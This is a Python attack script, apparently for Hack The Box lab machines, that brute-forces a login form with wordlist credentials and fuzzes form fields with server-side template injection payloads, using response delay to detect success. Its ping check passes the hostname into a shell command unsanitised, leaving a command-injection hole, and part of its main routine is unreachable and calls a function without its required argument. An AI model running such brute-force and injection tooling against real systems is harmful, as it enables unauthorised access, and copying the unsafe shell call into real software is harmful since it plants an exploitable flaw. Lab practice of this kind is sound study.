#!/usr/bin/env python3

import sys
import argparse
import random
import time
import subprocess

import requests 
from bs4 import BeautifulSoup
import urllib.parse
from urllib.parse import urljoin
from urllib.parse import urlencode
from urllib.parse import urlparse




def cypher(url):

#  url = "http://cypher.htb/login"

  session = requests.Session()
  response = session.get(url)
  
  soup = BeautifulSoup(response.text, "html.parser")

  form = soup.find("form")
  action = form.get("action")
  post_url = urljoin(url, action)
  print("This is the post URL: ", post_url)
  
  c = [("admin", "admin")]

  with open("wordlist.txt") as f:
      for word in f:
          for u, p in c:
              formatted = f'{{"username":"{word.strip()}","password":"{p}"}}'
              post_response = session.post(post_url, data=formatted, timeout=60)
              print(post_response.status_code)
              print(post_response.text, "with:", urllib.parse.quote_plus(formatted))
              time.sleep(1)
              formatted = f'{{"username":"{u}","password":"{word.strip()}"}}'
              post_response = session.post(post_url, data=formatted, timeout=60)
              print(post_response.status_code)
              print(post_response.text, "with:", formatted)
              time.sleep(1)


def weightedgrade(url):

  session = requests.Session()

#  url = "http://10.10.11.253/weighted-grade"
  response = session.get(url)
  
  soup = BeautifulSoup(response.text, "html.parser")
  
  form = soup.find("form")
  action = form.get("action")
  post_url = urljoin(url, action)
  print("This is the post URL: ", post_url)
  
  payload = {}

  
  for input_tag in form.find_all("input"):
      name = input_tag.get("name")
      value = input_tag.get("value", "")
  
      if name:
          payload[name] = value
      if not value and input_tag.get("type") == "number" and input_tag.has_attr("required"):
          payload[name] = 20

      if not value and input_tag.get("type") == "text" and input_tag.has_attr("required"):
          payload[name] = "test"

  with open("wordlist.txt") as f:
    for x in f:
      for k, v in payload.items():
        if payload[k] == "test":
            temp = payload[k]
            payload[k] = "FUZZVALUE"
            encoded_payload = urlencode(list(payload.items()))
            encoded_payload = encoded_payload.replace('FUZZVALUE', x.strip())

            start = time.monotonic()
            post_response = session.post(post_url, data=encoded_payload, timeout=60)
            elapsed = time.monotonic() - start

            if elapsed > 5:
                print(f"⚠️ Slow response successuful Ruby SSTI: {elapsed:.2f}s")
                print("Full Payload:", encoded_payload)
                print("payload: ", x)
                sys.exit()
            payload[k] = temp
            print(post_response.status_code)
#            print(post_response.text)
        else:
            continue


def check_ping(hostname) -> bool:
    print("hostname:",hostname)
    try:
        subprocess.check_output(
            "ping -c 1 " + hostname, shell=True
        )
    except Exception:
        return False

    print('Ping: Success')
    return True

def parse_arguments():

  parser = argparse.ArgumentParser(
          prog='swb.py',
          description='Swissbomb demo',
          epilog='this is the epilog')

  parser.add_argument('url', help='the URL of your choice: %(prog)s  http://htburl.htb', type=str)
  parser.add_argument('--noping', help='skip the default ping check', action='store_true')
  args = parser.parse_args()
  return args

def main():

  args = parse_arguments()
  url = args.url
  parsed_url = urlparse(url)
  hostname = parsed_url.hostname

  if args.noping:
      print("Skipping the ping check")
  else:
      if not check_ping(hostname):
          print("ping check failed")
          sys.exit()

  print('Target:', url)
  time.sleep(5)
    
# select function to run
  cypher(url)
  sys.exit()
  weightedgrade()
  sys.exit()

if __name__=="__main__":
    main()

